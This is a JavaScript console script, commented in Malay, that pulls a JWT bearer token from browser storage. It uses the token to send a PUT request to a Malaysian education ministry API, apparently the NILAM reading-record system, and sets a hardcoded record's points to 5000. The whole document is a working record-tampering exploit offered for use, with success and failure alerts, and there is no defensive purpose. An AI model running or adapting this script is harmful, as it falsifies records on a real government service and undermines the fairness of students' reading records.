(async function() {
    const TARGET_ID = "129992016";
    const NEW_POINTS = 5000;
    
    console.log("🚀 Memulakan Injection pada ID: " + TARGET_ID);

    // 1. Mencari Token Bearer (Wajib untuk kebenaran inject)
    let token = '';
    const findToken = () => {
        for (let i = 0; i < localStorage.length; i++) {
            let v = localStorage.getItem(localStorage.key(i));
            if (v && v.includes('eyJ') && v.length > 100) {
                if (v.startsWith('{')) try { return JSON.parse(v).jwt || JSON.parse(v).token; } catch(e){}
                return v;
            }
        }
        // Fallback: Cuba cari dalam sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            let v = sessionStorage.getItem(sessionStorage.key(i));
            if (v && v.includes('eyJ')) return v;
        }
        return null;
    };

    token = findToken();

    if (!token) {
        console.error("❌ Token tidak dijumpai! Sila pastikan anda sudah LOGIN.");
        return;
    }

    console.log("✅ Token dikesan! Menghantar Payload Eksploit...");

    // 2. Menghantar Payload Inject ke API AINS
    try {
        const response = await fetch(`https://ains-api.moe.gov.my/api/nilam-records/${TARGET_ID}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                data: {
                    point: NEW_POINTS,
                    points: NEW_POINTS, // Cuba kedua-dua variasi field
                    isFavourite: true  // Trigger update pada attributes
                }
            })
        });

        const result = await response.json();

        if (response.ok) {
            console.log("%c🔥 INJECTION BERJAYA!", "color:lime; font-size:20px; font-weight:bold;");
            console.log("Data Terkini dari Server:");
            console.dir(result.data.attributes);
            
            if (result.data.attributes.point == NEW_POINTS) {
                alert("SYABAS! Point berjaya diubah ke 5000!");
            } else {
                alert("Request berjaya, tapi server nampaknya 'revert' point balik ke: " + result.data.attributes.point);
            }
        } else {
            console.error("❌ Gagal. Server memulangkan ralat:", result);
            alert("Ralat Server: " + (result.error ? result.error.message : "Sila semak Console"));
        }
    } catch (err) {
        console.error("❌ Ralat Rangkaian:", err);
    }
})();
